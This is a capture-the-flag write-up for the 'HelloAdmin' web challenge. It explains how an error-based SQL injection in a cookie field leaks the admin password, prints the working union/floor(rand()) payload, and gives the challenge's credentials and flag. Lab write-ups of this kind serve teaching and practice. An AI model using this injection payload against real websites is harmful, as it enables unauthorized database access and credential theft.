#HelloAdmin

**Category:** Web
**Points:** 20

**Description:**

Log in as 'admin' and you will see the flag!

http://helloadmin.iutcert.io

##HelloAdmin-Solution:

This challenge is based on sql-injection. Users are given a login page. Using ```test:test``` they can login and will be redirected to user.php page.
There is also another page named admin.php but they could access it only when the cookie ```Admin``` is equal to 1.

checking for sql-injection vulnerability, users can find out when they send a request to admin.php with below values in Cookie field of header, site is vulnerable to sqli and will respond with a sql error:

```
Cookie: PHPSESSID=3407qk4ll60du17iusmoo6s6t4; MyCookie="; Admin=1
```

The concept of this challenge is that MyCookie field is vulnerable, but when everything is ok only the message ```hello test``` will be shown in page.
It means that no value from database will be shown on this page and users can not see database fields and their values.

The solution is simple, 
####find a way to see the results of query in error. 
here is the query for geting the password of admin:

```
Cookie: PHPSESSID=3407qk4ll60du17iusmoo6s6t4; MyCookie=" union select 1,2,3,count(*), concat((select password from users limit 0,1),floor(rand()*3))a from information_schema.tables group by a--+; Admin=1
```

And by logging as admin they can see the flag:

```
username: admin
password: YouC4nNOTLoginAsM3
```
####flag: ```VOW_YOU_l0gg3d_in_AS_M3333```